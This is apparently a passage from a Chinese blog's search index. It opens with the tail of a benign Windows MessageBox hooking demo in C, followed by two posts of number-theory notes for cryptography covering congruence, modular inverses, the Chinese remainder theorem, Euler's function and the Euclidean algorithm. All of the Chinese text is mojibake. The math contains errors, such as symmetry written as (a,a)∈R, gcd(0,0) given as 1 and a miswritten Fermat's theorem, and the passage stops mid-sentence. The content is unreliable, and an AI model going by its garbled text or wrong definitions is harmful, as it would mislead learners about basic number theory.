class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> WINAPI <span class="title function_">mybox</span><span class="params">(_In_opt_ HWND hWnd, </span></span><br><span class="line"><span class="params"> _In_opt_ LPCWSTR lpText, </span></span><br><span class="line"><span class="params"> _In_opt_ LPCWSTR lpCaption, </span></span><br><span class="line"><span class="params"> _In_ UINT uType)</span></span><br><span class="line">&#123;</span><br><span class="line">lpText = <span class="string">L&quot;hooked&quot;</span>;</span><br><span class="line">pfun(hWnd, lpText, lpCaption, uType);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ ·è°ƒç”¨æ—¶ï¼Œä¼šå…ˆæ˜¾ç¤º3ä¸ªhookï¼Œåœ¨æœ€åæ˜¾ç¤º123123.</p><hr><p>å®Œ</p>]]></content>
      
      
      <categories>
          
          <category> çŸ¥è¯†é›† </category>
          
          <category> é€†å‘ </category>
          
          <category> æŠ€èƒ½ </category>
          
          <category> Hook </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é€†å‘ </tag>
            
            <tag> å®è·µ </tag>
            
            <tag> hook </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¯†ç å­¦æ•°å­¦åŸºç¡€2</title>
      <link href="/posts/84e84aaa.html"/>
      <url>/posts/84e84aaa.html</url>
      
        <content type="html"><![CDATA[<h2 id="ç­‰ä»·å…³ç³»">ç­‰ä»·å…³ç³»</h2><p>ä¸€ï¼š<br>äºŒå…ƒå…³ç³»&quot;=&quot;ï¼š</p><ul><li>è‡ªåæ€§ï¼šå¯¹äºæ‰€æœ‰$a\in R$,éƒ½æœ‰$a=a$</li><li>å¯¹ç§°æ€§ï¼šå¯¹äºæ‰€æœ‰$a,b\in R$,éƒ½æœ‰$a=b\rightarrow b=a$</li><li>ä¼ é€’æ€§ï¼šå¯¹äºæ‰€æœ‰$a,b,c\in R$,éƒ½æœ‰$a=b,b=c\rightarrow a=c$</li></ul><p>äºŒï¼š</p><p>äºŒå…ƒå…³ç³»&quot;$\cong$&quot;:</p><p>åŒæ ·æœ‰è‡ªåæ€§ï¼Œå¯¹ç§°æ€§ï¼Œä¼ é€’æ€§</p><h3 id="å®šä¹‰">å®šä¹‰</h3><p>è®¾é›†åˆSï¼Œä»¥åŠä¸€ä¸ªå®šä¹‰åœ¨Sä¸Šçš„äºŒå…ƒå…³ç³»Rï¼Œè‹¥Ræ»¡è¶³ä»¥ä¸‹æ€§è´¨ï¼Œåˆ™ç§°å®ƒä¸º&quot;ç­‰ä»·å…³ç³»&quot;,ä»¥å…ƒç»„çš„å½¢å¼è¡¨ç¤º</p><ul><li>è‡ªåæ€§ï¼šå¯¹äºæ‰€æœ‰$a\in S$,éƒ½æœ‰($a,a)\in R$</li><li>å¯¹ç§°æ€§ï¼šå¯¹äºæ‰€æœ‰$a,b\in S$,éƒ½æœ‰$(a,a)\in R$</li><li>ä¼ é€’æ€§ï¼šå¯¹äºæ‰€æœ‰$a,b,c\in S$,éƒ½æœ‰$(a,b)\in R,(b,c)\in R\rightarrow (a,c)\in R$</li></ul><hr><h2 id="åŒä½™">åŒä½™</h2><h3 id="å®šä¹‰-2">å®šä¹‰</h3><p>$a \equiv b(\mod n)$ï¼šè®¾nä¸ºæ­£æ•´æ•°ï¼Œæ•´æ•°aï¼Œbåˆ†åˆ«æ¨¡nï¼Œå¦‚æœå¾—åˆ°ç›¸åŒçš„ä½™æ•°(æˆ–n|(a-b))ï¼Œå°±ç§°aå’Œbåœ¨æ¨¡nçš„æƒ…å†µä¸‹æ»¡è¶³åŒä½™å…³ç³»ï¼Œnè¢«ç§°ä¸ºæ¨¡æ•°ã€‚åŒä½™æ˜¯ä¸€ç§å…³ç³»,è€Œä¸æ˜¯ä¸€ç§è¿ç®—</p><h3 id="æ€§è´¨">æ€§è´¨</h3><p>$a \equiv b(\mod n)\iff a=qn+b,\exists q\in Z\rightarrow n|a-b$</p><p>åŒä½™æ˜¯ä¸€ç§<code>ç­‰ä»·å…³ç³»</code>,ä»¥ä¸‹æ€§è´¨å¯ä»¥é€†æ¨</p><ul><li>å¯¹äºåŒä¸€ä¸ªé™¤æ•°ï¼Œä¸¤ä¸ªæ•°çš„ä¹˜ç§¯ä¸å®ƒä»¬ä½™æ•°çš„ä¹˜ç§¯åŒä½™ã€‚</li><li>å¯¹äºåŒä¸€ä¸ªé™¤æ•°ï¼Œå¦‚æœæœ‰ä¸¤ä¸ªæ•´æ•°åŒä½™ï¼Œé‚£ä¹ˆå®ƒä»¬çš„å·®å°±ä¸€å®šèƒ½è¢«è¿™ä¸ªé™¤æ•°æ•´é™¤ã€‚</li><li>å¯¹äºåŒä¸€ä¸ªé™¤æ•°ï¼Œå¦‚æœä¸¤ä¸ªæ•°åŒä½™ï¼Œé‚£ä¹ˆä»–ä»¬çš„ä¹˜æ–¹ä»ç„¶åŒä½™ã€‚</li><li>å¯¹äºåŒä¸€ä¸ªé™¤æ•°ï¼Œè‹¥ä¸‰ä¸ªæ•°aâ‰¡bï¼ˆmod mï¼‰ï¼Œbâ‰¡cï¼ˆmod mï¼‰ï¼Œé‚£ä¹ˆa,b,cä¸‰ä¸ªæ•°å¯¹äºé™¤æ•°méƒ½åŒä½™ï¼ˆä¼ é€’æ€§ï¼‰ã€‚</li><li>å¯¹äºåŒä¸€ä¸ªé™¤æ•°ï¼Œè‹¥å››ä¸ªæ•°aâ‰¡bï¼ˆmod mï¼‰ï¼Œcâ‰¡dï¼ˆmod mï¼‰ï¼Œé‚£ä¹ˆaÂ±câ‰¡cÂ±dï¼ˆmod mï¼‰ï¼Œï¼ˆå¯åŠ å‡æ€§ï¼‰ã€‚</li><li>å¯¹äºåŒä¸€ä¸ªé™¤æ•°ï¼Œè‹¥å››ä¸ªæ•°aâ‰¡bï¼ˆmod mï¼‰ï¼Œcâ‰¡dï¼ˆmod mï¼‰ï¼Œé‚£ä¹ˆacâ‰¡cdï¼ˆmod mï¼‰ï¼Œï¼ˆå¯ä¹˜æ€§ï¼‰</li></ul><p>åŒä½™çš„è¿ç®—æ€§è´¨</p><p>è‹¥$a \equiv b(\mod n)$ï¼Œåˆ™ï¼š</p><ul><li>$a\pm m \equiv b\pm m(\mod n),m\in Z$</li><li>$a* m \equiv b* m(\mod n),m\in Z$</li><li>$a^m \equiv b^m(\mod n),m\in N$</li></ul><p>è‹¥åŒæ—¶$c \equiv d(\mod n)$,åˆ™ï¼š</p><ul><li>$a\pm c \equiv b\pm d(\mod n)$</li><li>$a* c \equiv b* d(\mod n)$</li></ul><hr><h2 id="ä¹˜æ³•é€†å…ƒ">ä¹˜æ³•é€†å…ƒ</h2><p>å€’æ•°ï¼šä¸¤ä¸ªæ•°çš„ä¹˜ç§¯ä¸º1ï¼Œè¿™ä¸¤ä¸ªæ•°äº’ä¸ºå€’æ•°</p><h3 id="å®šä¹‰-3">å®šä¹‰</h3><p>è®¾$a\in Z,n\in N,å¦‚æœaz\equiv 1(\mod n)$,åˆ™ç§°zæ˜¯æ¨¡nä¸‹açš„ä¹˜æ³•é€†å…ƒï¼Œè®°ä½œ$a^{-1}=z$</p><p>åœ¨æ¨¡è¿ç®—ä¸‹ï¼Œæ‰€æœ‰çš„å½¢å¦‚$a^{-1}$çš„å€¼éƒ½å¯ä»¥ç›´æ¥è¢«ä»£æ¢æˆaåœ¨æŸæ¨¡æ•°ä¸‹çš„ä¹˜æ³•é€†å…ƒï¼Œç„¶åç»§ç»­è¿ç®—</p><p>åªæœ‰å½“ä¸€ä¸ªæ•´æ•°å’Œæ¨¡æ•°äº’ç´ çš„æ—¶å€™ï¼Œå®ƒæ‰ä¼šæœ‰ä¹˜æ³•é€†å…ƒï¼Œå³ï¼š<br>$$<br>gcd(a,n)=1\iff æ¨¡nä¸‹æœ‰ä¹˜æ³•é€†å…ƒ<br>$$<br>æ±‚ä¹˜æ³•é€†å…ƒï¼š</p><p>æ‰©å±•æ¬§å‡ é‡Œå¾—ç®—æ³•</p><p>æ ¹æ®æœ€å¤§å…¬çº¦æ•°è¡¨ç¤ºå®šç†ï¼š<br>$$<br>gcd(a,n)=1 \rightarrow as+tn = 1<br>$$<br>ç­‰å¼ä¸¤è¾¹åŒæ—¶mod n:<br>$$<br>as \equiv 1 (\mod n)<br>$$<br>âˆ´æ¨¡nä¸‹açš„é€†å…ƒæ˜¯s</p><p>âˆ´è°ƒç”¨gcdå‡½æ•°ä¼ å…¥aå’Œnç®—å‡ºçš„så³ä¸ºä¹˜æ³•é€†å…ƒ</p><hr><h2 id="ä¸€æ¬¡åŒä½™æ–¹ç¨‹">ä¸€æ¬¡åŒä½™æ–¹ç¨‹</h2><p>$$<br>a \equiv b(\mod n)<br>$$</p><p>ç­‰ä»·äºä¸‹é¢è¿™ä¸ªå½¢å¼ï¼Œå…¶ä¸­mæ˜¯aï¼Œbï¼Œnçš„å…¬å› æ•°<br>$$<br>a/m \equiv b/m(\mod n/m)<br>$$<br>å¦‚æœgcd(m,n)=1,é‚£ä¹ˆ<br>$$<br>a/m \equiv b/m(\mod n)<br>$$<br>æ‰æ˜¯æˆç«‹çš„</p><h3 id="åŒä½™ä¸‹çš„æ¶ˆå»å¾‹">åŒä½™ä¸‹çš„æ¶ˆå»å¾‹</h3><p>è®¾$a,n\in Z,n&gt;0$,å¦‚æœ$gcd(a,n)=d$,æœ‰<br>$$<br>az \equiv azâ€™(\mod n)\rightarrow z \equiv zâ€™(\mod n/d)<br>$$</p><h3 id="åŒä½™æ–¹ç¨‹çš„è§£">åŒä½™æ–¹ç¨‹çš„è§£</h3><p>$x \equiv b(\mod n)$çš„è§£é›†ï¼š{$b\pm nk$,å…¶ä¸­$k=0,1,2,â€¦$}</p><p>åŒæ—¶æœ‰è§„å¾‹:<br>åŸæ¨¡æ•°ä¸ºnï¼Œç»ˆæ¨¡æ•°ä¸ºmï¼Œè®¾n/m = d,æœ‰0~n-1ä¹‹é—´è§£çš„æ•°é‡ç­‰äºd</p><h3 id="ä¸€æ¬¡åŒä½™æ–¹ç¨‹æœ‰è§£çš„æ¡ä»¶">ä¸€æ¬¡åŒä½™æ–¹ç¨‹æœ‰è§£çš„æ¡ä»¶</h3><p>è‹¥gcd(a,n)=d,åˆ™<br>$$<br>ax \equiv b(\mod n)æœ‰è§£ \iff d|b<br>$$</p><hr><h2 id="å‰©ä½™ç±»">å‰©ä½™ç±»</h2><h3 id="ç­‰ä»·ç±»">ç­‰ä»·ç±»</h3><p>ç­‰ä»·ç±»æ˜¯ç­‰ä»·å…³ç³»çš„ä¸€ç§æ€§è´¨ï¼Œè‹¥~æ˜¯Sä¸Šçš„ç­‰ä»·å…³ç³»ï¼Œå¯¹äº$a\in S$,å®šä¹‰å…¶ç­‰ä»·ç±»ä¸º{$x\in S|x\sim a$}</p><p>ç”±äºåŒä½™å…³ç³»æ˜¯ç­‰ä»·å…³ç³»ï¼Œæ‰€ä»¥åŒä½™ä¸­ä¹Ÿæœ‰ç­‰ä»·ç±»ï¼Œè¢«å«åšå‰©ä½™ç±»</p><h3 id="å‰©ä½™ç±»-2">å‰©ä½™ç±»</h3><p>è®¾$a\in Z$,å®šä¹‰å…¶å‰©ä½™ç±»ä¸º{$x\in Z|x\equiv a(\mod n)$}<br>è®°ä½œ$[a]_n$ç®€è®°ä¸º$[a]$,æœ€ç®€å¯åŒ–ä¸ºa(å¦‚æœæ²¡æœ‰æ­§ä¹‰)</p><p>å‰©ä½™ç±»ä¸­æ¯ä¸€ä¸ªæ•´æ•°éƒ½å«åšè¿™ä¸ªå‰©ä½™ç±»çš„ä»£è¡¨å…ƒ.<br>$Z_n$è¡¨ç¤ºæ¨¡nä¸‹æ‰€æœ‰å‰©ä½™ç±»çš„é›†åˆ</p><p>å®šä¹‰å‰©ä½™ç±»ä¹‹é—´çš„è®¡ç®—ï¼š</p><p>$[a]+[b]=[a+b]$</p><p>$[a]<em>[b]=[a</em>b]$</p><p>å³ï¼šæœ€åå¾—åˆ°çš„æ˜¯ä»¥a+b/abä¸ºä»£è¡¨å…ƒçš„å‰©ä½™ç±»</p><p>è®¾$u,v\in Z_n$ï¼ˆ$Z_n$æ˜¯åŒ…å«æ‰€æœ‰å‰©ä½™ç±»çš„é›†åˆï¼‰,è‹¥uv=[1],åˆ™uï¼Œväº’ä¸ºä¹˜æ³•é€†å…ƒ</p><p>å†å®šä¹‰$Z_n^*$ä¸º$Z_n$ä¸­æœ‰ä¹˜æ³•é€†å…ƒçš„å‰©ä½™ç±»</p><h3 id="Z-n-ä¸-Z-n-çš„å…³ç³»">$Z_n^*$ä¸$Z_n$çš„å…³ç³»</h3><ul><li>nä¸ºç´ æ•°ï¼š$Z_n^*$=$Z_n$ \ {[0]}</li><li>nä¸ºåˆæ•°ï¼š$Z_n^*$$\subsetneq$$Z_n$ \ {[0]}</li></ul><hr><h2 id="ä¸­å›½å‰©ä½™å®šç†">ä¸­å›½å‰©ä½™å®šç†</h2><h3 id="ä¸€æ¬¡åŒä½™æ–¹ç¨‹ç»„">ä¸€æ¬¡åŒä½™æ–¹ç¨‹ç»„</h3><p>è®¾ä¸¤ä¸¤äº’ç´ çš„æ¨¡æ•°$n_1,â€¦,n_m\in N$,åŠä»»æ„æ•´æ•°$a_1,â€¦,a_m\in Z$,å¹¶è®¾$n=\prod_{i=1}^mn_i$<br>$$<br>\begin{cases}<br>x\equiv a_1(\mod n_1)\<br>â€¦\<br>x\equiv a_m(\mod n_m)<br>\end{cases}<br>$$<br>ä¸ºäº†æ±‚è§£è¿™ä¸ªæ–¹ç¨‹ï¼Œæˆ‘ä»¬éœ€è¦ä¸­å›½å‰©ä½™å®šç†CRT</p><h3 id="ä¸­å›½å‰©ä½™å®šç†-2">ä¸­å›½å‰©ä½™å®šç†</h3><p>è®¾ä¸¤ä¸¤äº’ç´ çš„æ¨¡æ•°$n_1,â€¦,n_m\in N$,åŠä»»æ„æ•´æ•°$a_1,â€¦,a_m\in Z$,å¹¶è®¾$n=\prod_{i=1}^mn_i$ï¼Œæ–¹ç¨‹ç»„<br>$$<br>\begin{cases}<br>x\equiv a_1(\mod n_1)\<br>â€¦\<br>x\equiv a_m(\mod n_m)<br>\end{cases}<br>$$<br>å¿…æœ‰è§£ï¼Œè®¾è§£ä¸º$a\in Z$.å¹¶ä¸”å¯¹ä»»æ„$aâ€™\in Z$,éƒ½æœ‰<br>$$<br>aâ€™æ˜¯æ–¹ç¨‹ç»„çš„è§£ \iff a \equiv aâ€™(\mod n)<br>$$<br>æ±‚è§£æ–¹æ³•ï¼š</p><ul><li>å¾—åˆ°æ¯ä¸ªæ–¹ç¨‹ç»„çš„æ¨¡æ•°$n_1,n_2,â€¦$</li><li>æ±‚$n  =\prod_{i=1}^mn_i$</li><li>æ±‚$n_i^*=n/n_i$</li><li>æ±‚$n_i^{<em>-1}$(åœ¨å¯¹åº”æ¨¡æ•°ä¸‹$n_i^</em>$çš„ä¹˜æ³•é€†å…ƒ)</li><li>æ±‚$e_i = n_i^{<em>-1} * n_i^</em>$</li><li>æ±‚$a = \sum_{i=1}^{m}e_ia_i$</li><li>æ±‚$a\mod n$ä¸ºæœ€åçš„ç»“æœ</li></ul><hr><h2 id="æ¬§æ‹‰å‡½æ•°">æ¬§æ‹‰å‡½æ•°</h2><p>å¦‚æœå·²çŸ¥é›†åˆ$Z_{n}^*={Z_{n}ä¸­æœ‰ä¹˜æ³•é€†å…ƒçš„å‰©ä½™ç±»}={[a]|a=0,1,â€¦,gcd(a,n)=1}$</p><p>é‚£ä¹ˆï¼Œç»™å®šä¸€ä¸ªnï¼Œå¦‚ä½•æ±‚$Z_{n}^*$ä¸­æœ‰å¤šå°‘ä¸ªæ•´æ•°/å‰©ä½™ç±»å‘¢</p><p>å®šä¹‰ï¼šæ¬§æ‹‰å‡½æ•°ï¼Œè¡¨ç¤ºä¸º$\phi (n)$ï¼Œè¡¨ç¤ºå¤§äº0ï¼Œå°äºç­‰äºnçš„è‡ªç„¶æ•°å’Œnäº’è´¨çš„æ•°çš„ä¸ªæ•°ï¼Œ<br>å³ï¼š$\phi (n):=\left|Z_{n}^*\right|$ï¼ˆç‰¹åˆ«åœ°ï¼Œ$\phi (1)=1$ï¼‰</p><h3 id="æ€§è´¨-2">æ€§è´¨</h3><p>è®¾ä¸¤ä¸¤äº’ç´ çš„æ­£æ•´æ•°$n_1,â€¦,n_m\in N$å¹¶è®¾$n  =\prod_{i=1}^mn_i$ï¼Œé‚£ä¹ˆæœ‰ï¼š$\phi (n)=\prod\limits^m_{i=1}\phi (n_i)$<br>ç”¨ä¸­å›½å‰©ä½™å®šç†+ä¸­å›½å‰©ä½™æ˜ å°„æ±‚è¯</p><p>è‹¥pæ˜¯ç´ æ•°ï¼Œ<br>$\phi (p^k)=p^{k-1}\phi Â§$<br>$\phi Â§=p-1$</p><h2 id="æ¬§æ‹‰å®šç†å’Œè´¹é©¬å°å®šç†">æ¬§æ‹‰å®šç†å’Œè´¹é©¬å°å®šç†</h2><h3 id="ä¹˜æ³•é˜¶">ä¹˜æ³•é˜¶</h3><p>è®¾$a\in Z_n^*$ï¼Œä½¿å¾—$a^k\equiv 1(\mod n)$çš„æœ€å°æ­£æ•´æ•°kç§°ä½œaåœ¨æ¨¡nä¸‹çš„ä¹˜æ³•é˜¶ã€‚ç®€å†™ä¸ºaçš„é˜¶.</p><p>å¦‚æœ$a\in Z_n^*$ï¼Œå…¶é˜¶ä¸ºkï¼Œåˆ™$a^0,a^1,a^2,â€¦,a^{k-1}$å½¼æ­¤ä¸åŒ(æ³¨æ„è¿™é‡Œæ˜¯å‰©ä½™ç±»ï¼Œè¦å–æ¨¡)</p><h4 id="æ€§è´¨-3">æ€§è´¨</h4><p>$$<br>a^i\equiv1(\mod n)\iff k|i\<br>a^i\equiv a^j(\mod n) \iff i\equiv j (\mod k)<br>$$</p><h3 id="æ¬§æ‹‰å®šç†">æ¬§æ‹‰å®šç†</h3><p>è‹¥$a\in Z_n^*$ï¼Œåˆ™ï¼š$a^{\phi(n)}\equiv 1\mod n$ï¼Œä¸”$k|\phi(n)$ï¼Œkä¸ºaåœ¨æ¨¡nä¸‹çš„é˜¶ã€‚</p><blockquote><p>ç”±äºä¹˜æ³•çš„å°é—­æ€§ï¼Œ$Z_n^<em>$ä¸­æ¯ä¸ªå…ƒç´ å½¼æ­¤ä¸åŒï¼Œä¸”ä¹˜ä»¥aåå¾—åˆ°çš„æ‰€æœ‰å…ƒç´ çš„é›†åˆè¿˜æ˜¯$Z_n^</em>$</p><p>æ‰€ä»¥ï¼š</p><p>$\prod\limits_{b\in Z_n^<em>}b\equiv\prod\limits_{b\in Z_n^</em>}ab \mod n$</p><p>ç”±äºbæ˜¯æœ‰å‰©ä½™ç±»çš„å…ƒç´ ï¼Œé‚£ä¹ˆä¸ªæ•°æ˜¯$\phi (n)$ä¸ª</p><p>æ‰€ä»¥ï¼š</p><p>$\prod\limits_{b\in Z_n^<em>}b\equiv a^{\phi (n)}\prod\limits_{b\in Z_n^</em>}b \mod n$</p><p>å¾—è¯</p></blockquote><h3 id="è´¹é©¬å°å®šç†">è´¹é©¬å°å®šç†</h3><p>å¯¹æ¬§æ‹‰å®šç†å·¦å³åŒä¹˜aå¾—ï¼š<br>$$<br>a^n\equiv a\mod p<br>$$<br>å¯¹äºä»»æ„ç´ æ•°pï¼Œå’Œæ•´æ•°$a\in Z_p$,éƒ½æˆç«‹</p><hr><p>è¡¥å……:</p><p>è®¾$a\in Z_n^*,m\in Z$ï¼Œaåœ¨æ¨¡nä¸‹çš„é˜¶ä¸ºkï¼Œåˆ™ï¼š$a^m$åœ¨æ¨¡nä¸‹çš„é˜¶ä¸º$\frac {k}{gcd(m,k)}$</p><p>å³æ‰¾å‡ºkå’Œmçš„lcmï¼Œlcm/må°±æ˜¯é˜¶</p>]]></content>
      
      
      <categories>
          
          <category> å¯†ç å­¦ </category>
          
          <category> åŸºç¡€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> åŒä½™ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¯†ç å­¦æ•°å­¦åŸºç¡€1</title>
      <link href="/posts/1de11b10.html"/>
      <url>/posts/1de11b10.html</url>
      
        <content type="html"><![CDATA[<h2 id="æ•´é™¤æ€§">æ•´é™¤æ€§</h2><p>è®¾$a,b\in Z$,å¦‚æœå­˜åœ¨ä¸€ä¸ª$q\in Z$ï¼Œä½¿å¾—$a=qb$,åˆ™ç§°â€œb<code>æ•´é™¤</code>aâ€æˆ–â€<code>bæ˜¯açš„å› å­</code>â€œ,è®°ä¸ºâ€œ$b|a$â€,å¹¶ç”¨$b\not\mid a$è¡¨ç¤ºbä¸æ•´é™¤a</p><p>åˆ™ï¼š</p><ul><li>$b|0$</li><li>$1|a$</li><li>$0|a \iff a=0$</li><li>$b|a \iff b|-a \iff -b|a$</li></ul><p>ä¸”ï¼š</p><p>è‡ªåæ€§ï¼š$a|a$<br>ä¼ é€’æ€§ï¼š$(b|a)\land (a|c) \rightarrow b|c$<br>ç›¸ä¹˜æ€§ï¼š$b|a \rightarrow bc|ac$<br>æ¶ˆå»æ€§ï¼š$(bc|ac) \land (c\not=0) \rightarrow b|a$<br>çº¿æ€§æ€§ï¼š$b|a \land b|c\rightarrow\forall s,t\in Z,b|(sa\pm tc)$<br>æ¯”è¾ƒæ€§ï¼š$a,b\in N,b|a \rightarrow b\leq a$</p><p>å®šç†ä¸€ï¼š$è®¾a,b \in Z,åˆ™(b|a \land a|b) \iff a=\pm b$</p><hr><h2 id="ç´ æ•°">ç´ æ•°</h2><p>å®šä¹‰ï¼šè®¾$n\in N\land n\geq2$,é™¤äº†$1å’Œn$ä»¥å¤–,æ²¡æœ‰å…¶å®ƒæ­£æ•´æ•°æ•´é™¤nï¼Œåˆ™nç§°ä½œâ€œ<code>ç´ æ•°</code>â€ï¼ˆç”¨pè¡¨ç¤ºï¼‰ï¼›å¦åˆ™ç§°ä¸ºâ€œåˆæ•°â€</p><p>æ³¨1ï¼š1æ—¢ä¸æ˜¯ç´ æ•°ä¹Ÿä¸æ˜¯åˆæ•°<br>æ³¨2ï¼šè‹¥nä¸ºåˆæ•°ï¼Œåˆ™n=abï¼Œå…¶ä¸­$1&lt;a&lt;n,1&lt;b&lt;n$</p><p>å¼•ç†2-1ï¼šä»»ä½•å¤§äº1çš„æ•´æ•°å¿…æœ‰ç´ å› å­ã€‚<br>å®šç†2-1ï¼šä»»ä½•åˆæ•°$n$éƒ½è‡³å°‘æœ‰ä¸€ä¸ªä¸è¶…è¿‡$\sqrt n$çš„ç´ å› å­<br>å®šç†2-2ï¼š(ç®—æ•°åŸºæœ¬å®šç†)</p><p>ä»»ä½•éé›¶æ•´æ•°$n$ï¼Œéƒ½å¯ä»¥è¡¨ç¤ºæˆå¦‚ä¸‹ä¹˜ç§¯å½¢å¼ï¼š<br>$$<br>n=\pm p{_1}^{e_1}â€¦p{_r}^{e_r}<br>$$<br>å…¶ä¸­ï¼Œ$p_1,â€¦p_r$æ˜¯äº’ä¸ç›¸åŒçš„ç´ æ•°ï¼Œ$e_1,â€¦e_r$æ˜¯æ­£æ•´æ•°ã€‚</p><p>å®šç†2-3:ç´ æ•°æœ‰æ— ç©·å¤šä¸ª(æ¬§å‡ é‡Œå¾—å®šç†)</p><hr><h2 id="æ¨¡è¿ç®—">æ¨¡è¿ç®—</h2><p>è®¾$a,b\in Z \land b&gt;0,è‹¥q,r\in Zæ»¡è¶³a=qb +r,ä¸”0\leq r &lt; b,$åˆ™å®šä¹‰:</p><p>$a \mod b := r$</p><p>$a \mod n = a - nâŒŠa/nâŒ‹(å‘ä¸‹æ•´é™¤); aâˆˆZ,nâˆˆN*(æ­£æ•´æ•°)$</p><h3 id="æ€§è´¨">æ€§è´¨</h3><p>$b|a \iff a \mod b = 0 $<br>$(a\pm b)\mod n =(a\mod n\pm b\mod n)\mod n $<br>$(a<em>b)\mod n =(a\mod n</em>b\mod n)\mod n $</p><hr><h2 id="æœ€å¤§å…¬çº¦æ•°">æœ€å¤§å…¬çº¦æ•°</h2><h3 id="å®šä¹‰">å®šä¹‰</h3><p>è®¾$a,b\in Z,å¦‚æœd \in Z  \land d|a,d|b,$åˆ™ç§°dæ˜¯aå’Œbçš„å…¬å› å­(å…¬çº¦æ•°)<br>å¦‚æœ$d\geq0$,ä¸”aå’Œbçš„æ‰€æœ‰å…¬å› å­éƒ½æ•´é™¤d,åˆ™ç§°dæ˜¯aå’Œbçš„æœ€å¤§å…¬çº¦æ•°,è®°ä½œgcd(a,b)</p><p>å…¬å› æ•°å¯ä»¥æ˜¯ä»»ä½•æ•´æ•°<br>æœ€å¤§å…¬å› æ•°åªèƒ½æ˜¯0æˆ–æ­£æ•´æ•°ï¼Œä¸èƒ½æ˜¯è´Ÿæ•°</p><p>ç‰¹åˆ«çš„ï¼Œgcd(0,0)=1</p><h3 id="äº’ç´ ">äº’ç´ </h3><p>å®šä¹‰ï¼šè®¾$a,b\in Z$,å¦‚æœgcd(a,b)=1,åˆ™ç§°aå’Œbäº’ç´ </p><p>è®¾gcd(a,b)=d,åˆ™å­˜åœ¨$q_1,q_2\in Z$,ä½¿å¾—$a=q_1d,b=q_2d$,ä¸”$gcd(q_1,q_2)=1$,æ‰€ä»¥$q_1å’Œq_2$äº’ç´ ã€‚</p><h3 id="æ¬§å‡ é‡Œå¾—ç®—æ³•-è¾—è½¬ç›¸é™¤æ³•">æ¬§å‡ é‡Œå¾—ç®—æ³•/è¾—è½¬ç›¸é™¤æ³•</h3><p>è®¾$a\geq b\geq 0$,æ±‚gcd(a,b)<br>æ•°å­¦åŸç†ï¼š</p><ul><li>b=0æ—¶ï¼Œgcd(a,0)=a</li><li>b&gt;0æ—¶ï¼Œgcd(a,b)=gcd(b,r)[a=qb+r]</li><li>æœ€ågcd(b,r)=gcd($r,r_1$)=gcd($r_n,0$)=$r_n$</li></ul><h4 id="è¯æ˜">è¯æ˜:</h4><p>gcdé€’å½’å®šå¾‹ï¼š</p><p>$gcd(a,b)=gcd(b,a\mod b)$</p><p>è¦è¯:<br>$$<br>gcd(a,b)=gcd(b,a\mod b)<br>$$</p><p>æ ¹æ®æ•´é™¤æ€§å®šç†ä¸€ï¼šå³è¯:<br>$$<br>gcd(a,b)|gcd(b, a \mod b) \land gcd(b,a \mod b)|gcd(a,b)<br>$$<br>å¯¹äºå‰ä¸€é¡¹ï¼š<br>$$<br>gcd(a,b)|gcd(b, a \mod b)<br>$$<br>è®¾ d = gcd(a, b)<br>âˆ´ d|a ä¸” d|b<br>âˆµæ ¹æ®æ¨¡çš„å®šä¹‰ï¼š<br>$$<br>a \mod bæ˜¯a,bçš„çº¿æ€§ç»„åˆ<br>$$</p><p>âˆµæ ¹æ®æ•´é™¤æ€§çš„çº¿æ€§æ€§ï¼š<br>$$<br>d|(aå’Œbçš„çº¿æ€§ç»„åˆ)<br>$$<br>âˆ´<br>$$<br>gcd(a,b)|gcd(b, a \mod b)<br>$$</p><p>å¯¹äºåä¸€é¡¹ï¼š<br>$$<br>gcd(b,a \mod b)|gcd(a,b)<br>$$<br>è®¾ c = gcd(b, a mod b)<br>âˆ´ c|b ä¸” c|(a mod b)<br>âˆµ a = qb +r<br>âˆµ r = a mod b<br>âˆ´ a = qb + a mod b ,å³:<br>$$<br>a æ˜¯ b å’Œ (a \mod b) çš„çº¿æ€§ç»„åˆ<br>$$<br>âˆ´æ ¹æ®æ•´é™¤æ€§çš„çº¿æ€§æ€§ï¼š<br>$$<br>c | a<br>$$<br>âˆµ c | aä¸”c | b</p><p>âˆ´<br>$$<br>c | gcd(a,b)<br>$$<br>âˆ´<br>$$<br>gcd(b,a \mod b)|gcd(a,b)<br>$$<br>å¾—è¯.</p><hr><h2 id="æ‰©å±•æ¬§å‡ é‡Œå¾—å®šç†">æ‰©å±•æ¬§å‡ é‡Œå¾—å®šç†</h2><h3 id="å®šç†5-1-æœ€å¤§å…¬çº¦æ•°è¡¨ç¤ºå®šç†">å®šç†5-1(æœ€å¤§å…¬çº¦æ•°è¡¨ç¤ºå®šç†)</h3><p>è®¾$a,b\in Z$,d=gcd(a,b),åˆ™å­˜åœ¨$s,t\in Z$,ä½¿å¾—$as+bt=d$</p><p>æ¨è®ºï¼š$d|v \iff as+bt=v$</p><p>åœ¨æ¬§å‡ é‡Œå¾—ç®—æ³•ä¸­ï¼Œè®¡ç®—å‡ºçš„qï¼Œæ ¹æ®é€’æ¨å…¬å¼ï¼š<br>$$<br>s_{i+1}=s_{i-1}-s_iq_i<br>$$</p><p>$$<br>t_{i+1}=t_{i-1}-t_iq_i<br>$$</p><p>åŒæ—¶,$s_0=1,s_1=0,s_0=0,s_1=1$,å¯ä»¥è®¡ç®—å‡º$s_nå’Œt_nå³æ˜¯æœ€åçš„så’Œt$</p><p>æ‰©å±•æ¬§å‡ é‡Œå¾—ç®—æ³•å°±æ˜¯ç”¨æ¥è®¡ç®—å®šç†5-1ä¸­çš„så’Œtçš„ã€‚åŒæ—¶æ±‚å‡ºgcd</p><hr><h2 id="æœ€å°å…¬å€æ•°">æœ€å°å…¬å€æ•°</h2><p>è®¾$a,b\in Z$,è‹¥$m\in Z$åˆ†åˆ«æ˜¯a,bçš„å€æ•°ï¼Œmç§°ä½œa,bçš„å…¬å€æ•°</p><p>lcm(a,b):a,bçš„æœ€å°å…¬å€æ•°(å¯ä»¥æ˜¯è´Ÿæ•°)</p><ul><li>è‹¥$a,b\not= 